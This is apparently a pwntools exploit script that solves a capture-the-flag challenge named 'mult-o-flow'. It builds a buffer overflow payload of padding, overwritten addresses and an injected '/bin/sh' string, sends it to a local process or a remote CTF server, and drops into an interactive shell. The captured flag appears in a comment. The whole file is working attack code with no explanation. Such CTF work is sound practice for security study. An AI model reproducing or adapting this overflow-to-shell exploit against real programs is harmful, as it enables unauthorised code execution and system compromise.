from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./mult-o-flow"
LIBC = ""
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="i386", bits=32)
# context.log_level = 'debug'

# FLAG{c0ngr4t5_on_pwn1ng_an_1RC_b0t}

def exploit(conn, elf, libc, local):
    conn.recvuntil("sir?\n")
    conn.send("A"*64)
    conn.recvline()

    isp = "ISP:AAAAAAAAA/bin/sh<"
    payload = ""
    payload += "A" * (4096 - len("City:AAAAAAAAA") - len("State/Region:AAAAAAAAA") - 450 - 8)
    payload += "City:AAAAAAAAA"
    payload += "A"*450
    payload += "State/Region:AAAAAAAAA"
    payload += "AAAAAAAA"
    payload += "A" * (0x218 - 8 - len("State/Region:AAAAAAAAA") - 450)
    payload += "\x82\x88\x04<"
    payload += "A" * (4096 + 512 - len(payload) - 4)
    payload += "\x33\x22\x11<"
    payload += "A" * (0x218 - len(isp) + 4)
    payload += isp
    payload += "\x24\xb1\x04"
    conn.send(payload)

    conn.interactive()
    conn.close()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("flatearth.fluxfingers.net", 1746)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(r, elf, libc, local=True)
